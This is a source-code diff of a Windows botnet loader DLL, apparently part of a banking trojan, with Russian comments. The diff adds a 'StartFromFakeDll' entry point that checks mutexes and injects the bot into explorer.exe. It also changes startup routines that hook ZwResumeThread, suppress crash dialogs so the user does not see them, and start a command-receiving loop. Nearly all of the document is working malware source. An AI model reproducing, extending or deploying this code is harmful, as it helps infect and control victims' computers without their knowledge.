@@ -15,6 +15,7 @@
 #include "BotEvents.h"
 #include "Loader.h"
 #include "Config.h"
+#include "BotCore.h"
 
 
 #include "Crypt.h"
@@ -64,8 +65,8 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 {
 	DLLDBG("====>Bot DLL", "-------- LoaderRoutine (v10)");
 
-
-	UnhookDlls();
+	BOT::Initialize();
+	//UnhookDlls();
 
 	// Отключаем отображение ошибок при крахе процесса
 	DisableShowFatalErrorDialog();
@@ -73,7 +74,7 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 	// Регистрируем глобальный менеджер задач
 	InitializeTaskManager(NULL, true);
 
-	// Инициализируем отсылку статистики
+	// Инициализируем систему отправки статистической информации
 	DebugReportInit();
 
 	// 402_pl запуск цикла получения команд (он получается в другом процессе)
@@ -127,19 +128,18 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 	return 0;
 }
 
-
-
 DWORD WINAPI ExplorerMain(LPVOID Data)
 {
-	DLLDBG("====>Bot DLL", "Запускаем бот. Префикс [%s]", GetPrefix());
+	BOT::Initialize();
 
-	UnhookDlls();
-
+	DLLDBG("====>Bot DLL", "Запускаем бот. Префикс [%s]", GetPrefix().t_str());
 	
+	//UnhookDlls();
+
 	// Отключаем отображение ошибок при крахе процесса
 	DisableShowFatalErrorDialog();
 
-	// Инициализируем отсылку статистики
+	// Инициализируем систему отправки статистической информации
 	DebugReportInit();
 
 	HookZwResumeThread();
@@ -148,8 +148,7 @@ DWORD WINAPI ExplorerMain(LPVOID Data)
 	// 401_pl запуск BotPlug
 	DebugReportStepByName("401_pl");
 
-		
-	DLLDBG("====>Bot DLL", "Стартуем Loader");
+	DLLDBG("====>Bot DLL", "Стартуем Loader ()");
 	MegaJump( LoaderRoutine );
 
 	
@@ -183,4 +182,43 @@ extern"C"  void WINAPI Start(LPVOID, LPVOID, LPVOID)
 }
 
 
+// Ф-ция для прыжка в Explorer при загрузке из StartFromFakeDll
+DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
+{
+	// Пробуем захватить мьютекс для обеспечения единственного Bot.plug в explorer
+	// при множественном запуске FakeDll
+	HANDLE ExplorerInstanceHandle = TryCreateSingleInstance("bplfklexpl");
 
+	DLLDBG("ExplorerEntryPointFromFakeDll", "ExplorerInstanceHandle=0x%X", ExplorerInstanceHandle);
+	if (ExplorerInstanceHandle == NULL) return 0;
+
+	// При загрузке просто вызывает Start, предусмотренную для
+	// обычного запуска Bot.plug
+	Start(NULL, NULL, NULL);
+	return 0;
+}
+
+// Експортируемая ф-ция для запуска Bot.plug из FakeDll.
+BOOL WINAPI StartFromFakeDll()
+{
+	DLLDBG("StartFromFakeDll", "Started.");
+
+	// Смотрим на то - запущен ли бот
+	HANDLE BotInstanceMutex = BOT::TryCreateBotInstance();
+
+	DLLDBG("StartFromFakeDll", "BOT::TryCreateBotInstance() result=0x%X", BotInstanceMutex);
+	if (BotInstanceMutex == NULL) return FALSE;
+
+	// Если бот не запущен - закрываем мьютекс, 
+	// поскольку мы не запущены в Explorer.
+	pCloseHandle(BotInstanceMutex);
+	
+	// Пробуем захватить мьютекс для обеспечения единственного запуска FakeDll
+	// на случай, если ДЛЛ инсталирована для нескольких целевых процессов процесов.
+	HANDLE FakeDllInstanceHandle = TryCreateSingleInstance("bplfkl");
+	DLLDBG("StartFromFakeDll", "FakeDllInstanceHandle=0x%X", FakeDllInstanceHandle);
+
+	if (FakeDllInstanceHandle == NULL) return FALSE;
+
+	return (InjectIntoExplorer(ExplorerEntryPointFromFakeDll) ? TRUE : FALSE);
+}
